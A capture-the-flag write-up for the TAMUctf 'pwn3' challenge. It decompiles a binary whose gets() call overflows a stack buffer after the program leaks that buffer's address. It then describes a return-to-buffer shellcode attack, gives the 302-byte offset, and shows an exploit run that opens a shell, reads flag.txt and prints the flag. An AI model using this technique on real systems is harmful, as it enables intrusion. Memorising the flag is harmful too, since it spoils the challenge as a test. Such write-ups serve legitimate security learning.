# Pwn3
Pwn

## Challenge 

nc pwn.tamuctf.com 4323

Difficulty: easy

[pwn3](pwn3)

## Solution

Running on server, we see a pointer

	$ nc pwn.tamuctf.com 4323
	Take this, you might need it on your journey 0xffe744de!
	

Decompile in Hopper

	int main(int arg0) {
	    __x86.get_pc_thunk.ax();
	    sub_440();
	    echo();
	    return 0x0;
	}

	void sub_440() {
	    (*(ebx + 0x18))(); // setvbuf
	}
	void sub_410() {
	    (*(ebx + 0xc))(); // printf
	}
	void sub_420() {
	    (*(ebx + 0x10))(); // gets
	}

	int echo() {
	    eax = __x86.get_pc_thunk.bx();
	    stack[1966] = &var_12A;    // Buffer Pointer
	    stack[1965] = ebx + 0x104; // "Take this, you might need it on your journey %p!"
	    eax = sub_410();           // printf
	    stack[1965] = &var_12A;    // Buffer Pointer
	    eax = sub_420();           // gets
	    esp = ((esp - 0x10) + 0x10 - 0x10) + 0x10;
	    ebx = var_4;
	    return eax;
	}

---

From `echo()`, we understand that:

1. `gets()` is vulnerable to buffer overflow
2. the pointer is the beginning of the buffer

With this, we can execute a return-to-buffer shellcode attack.

Using pwn cyclic, we get the offset of 302.

> I refer to some code from here: http://ctfhacker.com/ctf/pwnable/2015/08/05/polictf-johns-library.html

And created an exploit script using pwntools..

	# python solve.py 
	[*] Starting
	[+] Opening connection to pwn.tamuctf.com on port 4323: Done
	[*] Leaking buffer
	[*] Found address: 0xffc7f9be
	[*] Preparing shellcode
	[*] Sending shellcode
	[*] Switching to interactive mode

	$ ls
	flag.txt
	pwn3
	$ cat flag.txt
	gigem{r3m073_fl46_3x3cu710n}
	$  

## Flag

	gigem{r3m073_fl46_3x3cu710n}
